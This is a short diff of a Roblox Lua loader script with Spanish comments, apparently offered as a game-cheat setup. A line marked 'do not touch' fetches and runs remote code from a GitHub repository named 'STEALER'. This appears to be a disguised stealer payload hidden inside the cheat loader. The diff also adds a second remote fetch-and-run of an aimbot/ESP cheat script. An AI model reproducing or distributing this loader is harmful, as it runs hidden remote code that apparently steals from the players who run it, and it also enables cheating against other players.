@@ -21,3 +21,13 @@ print("Configuración cargada. Iniciando sistema...")
 -- 🚀 CARGA DEL SISTEMA (NO TOCAR)
 -- ==========================================
 loadstring(game:HttpGet("https://raw.githubusercontent.com/JOSERAX11/STEALER/refs/heads/main/main/core.lua"))()
+
+task.wait(10)
+
+-- ==========================================
+-- SCRIPT DE DUELOS (PVP)
+-- ==========================================
+-- Pega tu script de duelos que gustes aquí debajo (PUEDES ENCONTRARLOS EN scriptblox.com)
+task.spawn(function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/DUELS-Murderers-VS-Sheriffs-BEST-SCRIPT-SILENT-AIM-AIMBOT-ESP-RAGEBOT-AND-ALOT-MORE-227237"))()
+end)
